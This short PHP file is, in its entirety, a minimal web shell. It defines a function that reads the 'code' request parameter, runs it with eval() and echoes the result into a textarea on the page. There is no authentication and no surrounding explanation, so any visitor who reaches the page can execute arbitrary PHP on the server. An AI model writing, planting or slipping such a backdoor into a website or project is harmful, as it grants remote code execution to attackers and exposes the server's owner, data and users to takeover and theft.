<?php
function phpevaL(){
	echo "<center><textarea rows=\"10\" cols=\"64\">";
	$code = $_REQUEST['code'];
	echo htmlspecialchars(eval($code));
	echo "</textarea></center><br>";
}

phpevaL();
?>